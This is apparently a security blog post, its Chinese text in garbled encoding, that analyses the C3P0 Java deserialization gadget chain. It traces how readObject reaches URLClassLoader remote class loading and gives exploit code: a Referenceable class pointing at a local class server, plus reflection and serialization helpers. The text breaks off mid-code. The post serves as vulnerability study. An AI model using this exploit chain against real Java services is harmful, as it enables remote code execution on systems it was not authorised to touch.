    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a class="markdownIt-Anchor" href="#å‰è¨€">#</a> å‰è¨€</h1><p>C3P0 æ˜¯ä¸€ä¸ªå¼€æºçš„ JDBC è¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºå’Œ JNDI ç»‘å®šï¼Œæ”¯æŒ JDBC3 è§„èŒƒå’Œ JDBC2 çš„æ ‡å‡†æ‰©å±•ã€‚ç›®å‰ä½¿ç”¨å®ƒçš„å¼€æºé¡¹ç›®æœ‰ Hibernateï¼ŒSpring ç­‰ã€‚</p><p>JDBC æ˜¯ Java DataBase Connectivity çš„ç¼©å†™ï¼Œå®ƒæ˜¯ Java ç¨‹åºè®¿é—®æ•°æ®åº“çš„æ ‡å‡†æ¥å£ã€‚<br>ä½¿ç”¨ Java ç¨‹åºè®¿é—®æ•°æ®åº“æ—¶ï¼ŒJava ä»£ç å¹¶ä¸æ˜¯ç›´æ¥é€šè¿‡ TCP è¿æ¥å»è®¿é—®æ•°æ®åº“ï¼Œè€Œæ˜¯é€šè¿‡ JDBC æ¥å£æ¥è®¿é—®ï¼Œè€Œ JDBC æ¥å£åˆ™é€šè¿‡ JDBC é©±åŠ¨æ¥å®ç°çœŸæ­£å¯¹æ•°æ®åº“çš„è®¿é—®ã€‚</p><p>è¿æ¥æ± ç±»ä¼¼äºçº¿ç¨‹æ± ï¼Œåœ¨ä¸€äº›æƒ…å†µä¸‹æˆ‘ä»¬ä¼šé¢‘ç¹åœ°æ“ä½œæ•°æ®åº“ï¼Œæ­¤æ—¶ Java åœ¨è¿æ¥æ•°æ®åº“æ—¶ä¼šé¢‘ç¹åœ°åˆ›å»ºæˆ–é”€æ¯å¥æŸ„ï¼Œå¢å¤§èµ„æºçš„æ¶ˆè€—ã€‚ä¸ºäº†é¿å…è¿™æ ·ä¸€ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥æå‰åˆ›å»ºå¥½ä¸€äº›è¿æ¥å¥æŸ„ï¼Œéœ€è¦ä½¿ç”¨æ—¶ç›´æ¥ä½¿ç”¨å¥æŸ„ï¼Œä¸éœ€è¦æ—¶å¯å°†å…¶æ”¾å›è¿æ¥æ± ä¸­ï¼Œå‡†å¤‡ä¸‹ä¸€æ¬¡çš„ä½¿ç”¨ã€‚ç±»ä¼¼è¿™æ ·ä¸€ç§èƒ½å¤Ÿå¤ç”¨å¥æŸ„çš„æŠ€æœ¯å°±æ˜¯æ± æŠ€æœ¯ã€‚</p><h1 id="ç¯å¢ƒæ­å»º"><a class="markdownIt-Anchor" href="#ç¯å¢ƒæ­å»º">#</a> ç¯å¢ƒæ­å»º</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.mchange&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;c3p0&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">0.9</span><span class="number">.5</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h1 id="å…³äºc3p0æ”»å‡»é“¾çš„åˆ©ç”¨æ–¹å¼"><a class="markdownIt-Anchor" href="#å…³äºc3p0æ”»å‡»é“¾çš„åˆ©ç”¨æ–¹å¼">#</a> å…³äº C3P0 æ”»å‡»é“¾çš„åˆ©ç”¨æ–¹å¼</h1><p>1ã€URLClassLoader è¿œç¨‹ç±»åŠ è½½<br> 2ã€JNDI æ³¨å…¥<br> 3ã€åˆ©ç”¨ HEX åºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨è¿›è¡Œååºåˆ—åŒ–æ”»å‡»</p><h2 id="urlclassloader"><a class="markdownIt-Anchor" href="#urlclassloader">#</a> URLClassLoader</h2><p>æ¼æ´ç‚¹åœ¨ <code>PoolBackedDataSourceBase</code></p><p><code>readobject</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">( ObjectInputStream ois )</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">short</span> <span class="variable">version</span> <span class="operator">=</span> ois.readShort();</span><br><span class="line"><span class="keyword">switch</span> (version)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> VERSION:</span><br><span class="line"><span class="comment">// we create an artificial scope so that we can use the name o for all indirectly serialized objects.</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line"><span class="keyword">if</span> (o <span class="keyword">instanceof</span> IndirectlySerialized) o = ((IndirectlySerialized) o).getObject();</span><br><span class="line"><span class="built_in">this</span>.connectionPoolDataSource = (ConnectionPoolDataSource) o;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">this</span>.dataSourceName = (String) ois.readObject();</span><br><span class="line"><span class="comment">// we create an artificial scope so that we can use the name o for all indirectly serialized objects.</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line"><span class="keyword">if</span> (o <span class="keyword">instanceof</span> IndirectlySerialized) o = ((IndirectlySerialized) o).getObject();</span><br><span class="line"><span class="built_in">this</span>.extensions = (Map) o;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">this</span>.factoryClassLocation = (String) ois.readObject();</span><br><span class="line"><span class="built_in">this</span>.identityToken = (String) ois.readObject();</span><br><span class="line"><span class="built_in">this</span>.numHelperThreads = ois.readInt();</span><br><span class="line"><span class="built_in">this</span>.pcs = <span class="keyword">new</span> <span class="title class_">PropertyChangeSupport</span>( <span class="built_in">this</span> );</span><br><span class="line"><span class="built_in">this</span>.vcs = <span class="keyword">new</span> <span class="title class_">VetoableChangeSupport</span>( <span class="built_in">this</span> );</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Unsupported Serialized Version: &quot;</span> + version);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„åˆ°</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221433069.jpg" alt="img"></p><p>è¿™é‡Œä¼šå…ˆåˆ¤æ–­å¯¹è±¡ o æ˜¯å¦æ˜¯ <code>IndirectlySerialized</code>  ç±»çš„å¯¹è±¡æˆ–è€…æ˜¯å…¶å­ç±»çš„å¯¹è±¡<br>è°ƒç”¨ <code>getobject</code>  åå¼ºè½¬æ¢å¯¹è±¡ä¸º <code>ConnectionPoolDataSource</code> <br> ä½†æ˜¯è¯¥æ¥å£å¹¶ä¸èƒ½ååºåˆ—åŒ–</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221445345.png" alt="image-20230522144558281"></p><p>å»çœ‹ä¸‹å…¥å£ç‚¹ <code>writeobject</code>  å¤„çš„å†™æ³•<br> <code>writeobject</code></p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221446560.png" alt="image-20230522144609339"></p><p>çœ‹ä¸‹è°ƒç”¨è¿”å›çš„å¯¹è±¡<br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221446160.png" alt="image-20230522144627000"><br> æ˜¯ä¸€ä¸ª <code>ReferenceSerialized</code>  çš„æ„é€ æ–¹æ³•</p><p>ä¸¾ä¸ªä¸æ˜¯å¾ˆæ°å½“çš„ä¾‹å­<br> <code>ReferenceSerialized</code>  æ˜¯ â€œåŠ å¼ºç‰ˆâ€ çš„ <code>ConnectionPoolDataSource</code></p><p>ä¹Ÿå°±æ˜¯è¯´åœ¨åºåˆ—åŒ–æ—¶ï¼Œå®é™…ä¸Šçš„ç±»è¿›è¡Œäº†è½¬æ¢ï¼Œ <code>ConnectionPoolDataSource</code> -&gt; <code>ReferenceSerialized</code></p><p>å†å›åˆ° <code>readobject</code>  è°ƒç”¨çš„ <code>IndirectlySerialized.getobject</code> <br> ä½äº <code>ReferenceIndirector</code> <br> <code>getObject</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, IOException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    Context initialContext;</span><br><span class="line">    <span class="keyword">if</span> ( env == <span class="literal">null</span> )</span><br><span class="line">initialContext = <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">initialContext = <span class="keyword">new</span> <span class="title class_">InitialContext</span>( env );</span><br><span class="line"></span><br><span class="line">    <span class="type">Context</span> <span class="variable">nameContext</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> ( contextName != <span class="literal">null</span> )</span><br><span class="line">nameContext = (Context) initialContext.lookup( contextName );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ReferenceableUtils.referenceToObject( reference, name, nameContext, env ); </span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">catch</span> (NamingException e)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//e.printStackTrace();</span></span><br><span class="line">    <span class="keyword">if</span> ( logger.isLoggable( MLevel.WARNING ) )</span><br><span class="line">logger.log( MLevel.WARNING, <span class="string">&quot;Failed to acquire the Context necessary to lookup an Object.&quot;</span>, e );</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>( <span class="string">&quot;Failed to acquire the Context necessary to lookup an Object: &quot;</span> + e.toString() );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯å¯¹ç¯å¢ƒå˜é‡ä¸Šä¸‹æ–‡è¿›è¡ŒåŠ è½½<br>æˆ‘ä»¬å…³æ³¨ return è¿™é‡Œ <code>ReferenceableUtils.referenceToObject</code> ï¼Œè·Ÿè¿›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">referenceToObject</span><span class="params">( Reference ref, Name name, Context nameCtx, Hashtable env)</span></span><br><span class="line"><span class="keyword">throws</span> NamingException</span><br><span class="line">    &#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">fClassName</span> <span class="operator">=</span> ref.getFactoryClassName();</span><br><span class="line"><span class="type">String</span> <span class="variable">fClassLocation</span> <span class="operator">=</span> ref.getFactoryClassLocation();</span><br><span class="line"></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">defaultClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="keyword">if</span> ( defaultClassLoader == <span class="literal">null</span> ) defaultClassLoader = ReferenceableUtils.class.getClassLoader();</span><br><span class="line"></span><br><span class="line">ClassLoader cl;</span><br><span class="line"><span class="keyword">if</span> ( fClassLocation == <span class="literal">null</span> )</span><br><span class="line">    cl = defaultClassLoader;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>( fClassLocation );</span><br><span class="line">cl = <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>( <span class="keyword">new</span> <span class="title class_">URL</span>[] &#123; u &#125;, defaultClassLoader );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">fClass</span> <span class="operator">=</span> Class.forName( fClassName, <span class="literal">true</span>, cl );</span><br><span class="line"><span class="type">ObjectFactory</span> <span class="variable">of</span> <span class="operator">=</span> (ObjectFactory) fClass.newInstance();</span><br><span class="line"><span class="keyword">return</span> of.getObjectInstance( ref, name, nameCtx, env );</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">catch</span> ( Exception e )</span><br><span class="line">    &#123;</span><br><span class="line"><span class="keyword">if</span> (Debug.DEBUG) </span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">//e.printStackTrace();</span></span><br><span class="line"><span class="keyword">if</span> ( logger.isLoggable( MLevel.FINE ) )</span><br><span class="line">    logger.log( MLevel.FINE, <span class="string">&quot;Could not resolve Reference to Object!&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="type">NamingException</span> <span class="variable">ne</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(<span class="string">&quot;Could not resolve Reference to Object!&quot;</span>);</span><br><span class="line">ne.setRootCause( e );</span><br><span class="line"><span class="keyword">throw</span> ne;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥æ§åˆ¶ <code>fClassLocation</code> ï¼Œæœ€åé€šè¿‡ <code>URLClassLoader</code>  å¹¶åˆå§‹åŒ–è¯¥å®ä¾‹æ¥å®ç°æ¶æ„ä»£ç æ‰§è¡Œ</p><h3 id="gadget"><a class="markdownIt-Anchor" href="#gadget">#</a> Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PoolBackedDataSourceBase#readObject-&gt;</span><br><span class="line">ReferenceIndirector#getObject-&gt;</span><br><span class="line">ReferenceableUtils#referenceToObject-&gt;</span><br><span class="line">of(ObjectFactory)#getObjectInstance</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221455094.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> EXP</h3><p>è¿™é‡Œæœ‰ä¸ª <code>getReference</code>  æ–¹æ³•ï¼Œç›´æ¥è¿”å›ä¸€ä¸ª <code>Reference</code>  å¯¹è±¡</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221457621.png" alt="image-20230522145742572"></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥æ–¹æ³•ç›´æ¥æ„é€ å¯¹è±¡</p><p>è¿™é‡Œæˆ‘ä»¬è·å– <code>ConnectionPoolDataSource</code>  ç±»çš„ç§æœ‰å±æ€§ï¼Œå› ä¸ºååºåˆ—åŒ–çš„æ˜¯è¯¥ç±»å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">connectionPoolDataSourceField</span> <span class="operator">=</span> PoolBackedDataSourceBase.class.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);</span><br><span class="line">        connectionPoolDataSourceField.setAccessible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§ <code>getReference</code>  æ–¹æ³•å†é‡å†™ä¸€ä¸ªæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P01</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">C3P0</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;http://127.0.0.1:8002/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æœ€åæ˜¯ä¸¤ä¸ªå¸¸è§„æ–¹æ³•ï¼Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œä½†è¿™é‡Œæˆ‘ä»¬è¿˜éœ€è¦æŠŠæ„é€ å¥½çš„ <code>connectionPoolDataSource</code>  æ›¿æ¢æˆæˆ‘ä»¬æœ¬åœ°çš„ Calc<br> æ‰€ä»¥è¿™é‡Œå†é€šè¿‡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connectionPoolDataSourceField.set(poolBackedDataSourceBase,lp);  <span class="comment">//å°†å¯¹è±¡è¿›è¡Œä¿®æ”¹</span></span><br></pre></td></tr></table></figure><p>å¹¶æŠŠå®ƒå†™åœ¨åºåˆ—åŒ–å…¥å£ï¼Œç„¶ååœ¨ååºåˆ—åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P01</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">C3P0</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;http://127.0.0.1:8002/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayInputStream</span> <span class="variable">bain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">oin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bain))&#123;</span><br><span class="line">            oin.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span 